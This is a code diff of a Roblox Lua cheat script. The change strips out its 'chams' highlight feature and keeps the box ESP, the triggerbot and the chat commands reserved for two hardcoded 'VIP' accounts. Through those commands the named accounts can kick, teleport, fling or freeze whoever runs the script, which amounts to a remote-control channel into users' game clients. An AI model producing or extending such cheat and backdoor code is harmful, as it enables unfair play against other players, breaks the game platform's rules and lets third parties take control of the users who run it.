@@ -1,7 +1,6 @@
--- Full fixed script: VIP commands + Triggerbot + BOX ESP + Chams (Highlight, toggleable)
+-- Full fixed script: VIP commands + Triggerbot + BOX ESP (no chams)
 -- Added: .h partialName = add ESP (first partial match)
 --        .j partialName = remove ESP for specific player (first partial match) OR .j alone removes all
---        .c = toggle chams (default ON/green)
 --        .g = instant teleport to VIP (auto deattach if teleport succeeds)
 -- No prints. Safety pcall usage to avoid runtime errors.
 
@@ -18,12 +17,9 @@ local VIPUsers = { "draconvm", "Sypmorph" } -- VIP names (case-insensitive compa
 local BringTargets = {}      -- players to "bring" (legacy / fallback)
 local FrozenPlayers = {}     -- anchored players
 local targetedPlayers = {}   -- map of player.Name -> true for players with ESP
--- espObjects: maps Player -> { mode='drawing'|'gui', data=..., Highlight=Instance, CharConn=RBXScriptConnection }
+-- espObjects: maps Player -> { mode='drawing'|'gui', data=... }
 local espObjects = {}
 local lastTargetedPlayerName = nil
-
--- Chams toggle (default true)
-local Chams_Enabled = true
 
 --------------------------------------------------------------------------------
 -- Helper utilities (VIP functions)
@@ -179,52 +175,20 @@ local function createBillboardGui()
 end
 
 --------------------------------------------------------------------------------
--- addESP / removeESP (with Chams)
+-- addESP / removeESP
 --------------------------------------------------------------------------------
 local function addESP(targetPlayer)
     if not targetPlayer then return end
     if espObjects[targetPlayer] then return end
 
-    -- Create Highlight (chams)
-    local highlight
-    local ok = pcall(function()
-        highlight = Instance.new("Highlight")
-        highlight.Name = "WaveCham"
-        highlight.FillColor = Color3.fromRGB(0,255,0) -- default green
-        highlight.OutlineColor = Color3.fromRGB(0,0,0)
-        highlight.FillTransparency = 0.5
-        highlight.OutlineTransparency = 0
-        highlight.Adornee = targetPlayer.Character
-        highlight.Enabled = Chams_Enabled and targetPlayer.Character ~= nil
-        highlight.Parent = game:GetService("CoreGui")
-    end)
-    if not ok then highlight = nil end
-
-    -- Keep highlight attached after respawn
-    local charConn
-    if highlight then
-        charConn = targetPlayer.CharacterAdded:Connect(function(newChar)
-            task.defer(function()
-                if highlight and highlight.Parent then
-                    pcall(function()
-                        highlight.Adornee = newChar
-                        highlight.Enabled = Chams_Enabled and true or false
-                    end)
-                end
-            end)
-        end)
-    end
-
-    -- Drawing preferred
     if DrawingAvailable then
         local drawings = createBoxDrawings()
         if drawings then
-            espObjects[targetPlayer] = { mode = "drawing", data = drawings, Highlight = highlight, CharConn = charConn }
+            espObjects[targetPlayer] = { mode = "drawing", data = drawings }
             return
         end
     end
 
-    -- Fallback to BillboardGui
     local guiData = createBillboardGui()
     guiData.Conn = RunService.RenderStepped:Connect(function()
         if not targetPlayer or not targetPlayer.Character then return end
@@ -234,22 +198,12 @@ local function addESP(targetPlayer)
             guiData.Label.Text = (targetPlayer.DisplayName or targetPlayer.Name) .. " (@" .. targetPlayer.Name .. ")"
         end
     end)
-    espObjects[targetPlayer] = { mode = "gui", data = guiData, Highlight = highlight, CharConn = charConn }
+    espObjects[targetPlayer] = { mode = "gui", data = guiData }
 end
 
 local function removeESP(targetPlayer)
     local obj = espObjects[targetPlayer]
     if not obj then return end
-
-    if obj.CharConn then
-        pcall(function() obj.CharConn:Disconnect() end)
-        obj.CharConn = nil
-    end
-
-    if obj.Highlight then
-        pcall(function() obj.Highlight:Destroy() end)
-        obj.Highlight = nil
-    end
 
     if obj.mode == "drawing" and obj.data then
         local d = obj.data
@@ -267,23 +221,13 @@ local function removeESP(targetPlayer)
 end
 
 --------------------------------------------------------------------------------
--- Drawing update loop (for Drawing-based ESP)
+-- Drawing update loop
 --------------------------------------------------------------------------------
 if DrawingAvailable then
     RunService:BindToRenderStep("WaveBoxESP", Enum.RenderPriority.Camera.Value, function()
         for player, obj in pairs(espObjects) do
             if obj and obj.mode == "drawing" and obj.data then
                 local d = obj.data
-
-                if obj.Highlight then
-                    pcall(function()
-                        obj.Highlight.Enabled = Chams_Enabled and player and player.Character and true or false
-                        if player and player.Character and obj.Highlight.Adornee ~= player.Character then
-                            obj.Highlight.Adornee = player.Character
-                        end
-                    end)
-                end
-
                 if not player or not player.Character then
                     d.Box.Visible = false
                     d.Outline.Visible = false
@@ -343,7 +287,7 @@ if DrawingAvailable then
 end
 
 --------------------------------------------------------------------------------
--- Smooth bring loop (keeps target players being brought closer to VIPs)
+-- Smooth bring loop
 --------------------------------------------------------------------------------
 RunService.RenderStepped:Connect(function()
     for targetName, _ in pairs(BringTargets) do
@@ -444,12 +388,6 @@ end
 
 --------------------------------------------------------------------------------
 -- Chat commands (VIP only)
--- .h partialName  -> add ESP for first partial match
--- .j [partial]    -> remove ESP for first partial match, or if no arg, remove all
--- .c              -> toggle chams (Highlight)
--- .g              -> instant teleport to VIP (auto deattach on success)
--- .s              -> remove BringTargets flag for this client
--- other VIP commands carried over: .k .f .u .tp .fling .r
 --------------------------------------------------------------------------------
 local function onMessage(sender, msg)
     local vip = false
@@ -492,14 +430,6 @@ local function onMessage(sender, msg)
             lastTargetedPlayerName = nil
         end
 
-    elseif cmd == ".c" then
-        Chams_Enabled = not Chams_Enabled
-        for _, obj in pairs(espObjects) do
-            if obj.Highlight then
-                pcall(function() obj.Highlight.Enabled = Chams_Enabled end)
-            end
-        end
-
     elseif cmd == ".k" and LocalPlayer.Name:lower() ~= sender:lower() then
         pcall(function() LocalPlayer:Kick("Kicked by VIP") end)
 
@@ -512,7 +442,7 @@ local function onMessage(sender, msg)
                 local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
                 if myRoot and vipRoot then
                     pcall(function() myRoot.CFrame = vipRoot.CFrame + Vector3.new(0,3,0) end)
-                    -- do NOT set BringTargets (auto deattach)
+                    -- auto deattach: do not set BringTargets
                 else
                     -- fallback behavior: if parts missing, use BringTargets as before
                     BringTargets[LocalPlayer.Name] = true
